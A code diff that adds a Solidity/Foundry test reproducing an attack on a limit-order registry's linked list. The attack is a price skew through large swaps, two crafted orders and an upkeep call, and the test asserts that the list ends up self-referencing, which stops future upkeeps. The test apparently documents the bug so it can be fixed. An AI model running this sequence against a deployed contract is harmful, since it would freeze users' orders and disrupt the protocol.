@@ -1264,6 +1264,91 @@ contract LimitOrderRegistryTest is Test {
         vm.stopPrank();
     }
 
+    function testAttackerTanglingList() external {
+        // Assume ETH price is $1,200, and the order book currently looks like.
+        // 1,000 - 1,100 - 1,205 - 1,300
+        // Setup Linked list.
+        console.log("id0", id0);
+        uint96 usdcAmount = 1_000e6;
+        _createOrder(address(this), USDC_WETH_05_POOL, 100, USDC, usdcAmount);
+        _createOrder(address(this), USDC_WETH_05_POOL, 200, USDC, usdcAmount);
+
+        uint96 wethAmount = 1e18;
+        _createOrder(address(this), USDC_WETH_05_POOL, -100, WETH, wethAmount);
+        _createOrder(address(this), USDC_WETH_05_POOL, -200, WETH, wethAmount);
+
+        // Make sure list is setup correctly.
+        uint256[10] memory expectedHeads = [id0, id1, 0, 0, 0, 0, 0, 0, 0, 0];
+        uint256[10] memory expectedTails = [id2, id3, 0, 0, 0, 0, 0, 0, 0, 0];
+
+        _checkList(USDC_WETH_05_POOL, expectedHeads, expectedTails);
+
+        {
+            (, int24 currentTick, , , , , ) = USDC_WETH_05_POOL.slot0();
+            console.log("Current Tick", uint24(currentTick));
+        }
+
+        // Attacker skews price, then adds 2 orders that are BUY orders for ETH at a price above id0.
+        // Price moves to fill order.
+        {
+            address[] memory path = new address[](2);
+            path[0] = address(WETH);
+            path[1] = address(USDC);
+
+            uint24[] memory poolFees = new uint24[](1);
+            poolFees[0] = 500;
+
+            uint256 swapAmount = 450e18;
+            deal(address(WETH), address(this), swapAmount);
+            _swap(path, poolFees, swapAmount);
+        }
+
+        // Attacker creates two orders.
+        _createOrder(address(this), USDC_WETH_05_POOL, -20, WETH, wethAmount);
+        _createOrder(address(this), USDC_WETH_05_POOL, -40, WETH, wethAmount);
+
+        // Now that the orders are created, attacker fulfills the current HEAD which is ITM.
+
+        // {
+        //     (, int24 currentTick, , , , , ) = USDC_WETH_05_POOL.slot0();
+        //     console.log("Current Tick", uint24(currentTick));
+        // }
+
+        (bool upkeepNeeded, bytes memory performData) = registry.checkUpkeep(abi.encode(USDC_WETH_05_POOL));
+
+        assertEq(upkeepNeeded, true, "Upkeep should be needed.");
+
+        registry.performUpkeep(performData);
+        // At this point the list is illogical
+        {
+            address[] memory path = new address[](2);
+            path[0] = address(USDC);
+            path[1] = address(WETH);
+
+            uint24[] memory poolFees = new uint24[](1);
+            poolFees[0] = 500;
+
+            uint256 swapAmount = 567_000e6;
+            deal(address(USDC), address(this), swapAmount);
+            _swap(path, poolFees, swapAmount);
+        }
+        (uint256 head, uint256 tail, , , ) = registry.poolToData(USDC_WETH_05_POOL);
+        (, , , , , , , uint256 centerHeadHead, ) = registry.orderBook(head);
+        (, , , , , , , uint256 centerTailHead, ) = registry.orderBook(tail);
+
+        assertEq(centerHeadHead, tail, "Head of center head should point to center tail");
+        assertEq(centerTailHead, head, "Head of center tail should point to center head");
+
+        // The linked list is now pointing back into itself. And future upkeeps will not work.
+        // There is probably a way to recover the protocol but would require user cooperation,
+        // so we need to stop this from happening in the first place.
+
+        {
+            (, int24 currentTick, , , , , ) = USDC_WETH_05_POOL.slot0();
+            console.log("Current Tick", uint24(currentTick));
+        }
+    }
+
     function viewList(IUniswapV3Pool pool) public view returns (uint256[10] memory heads, uint256[10] memory tails) {
         uint256 next;
         (next, , , , ) = registry.poolToData(pool);
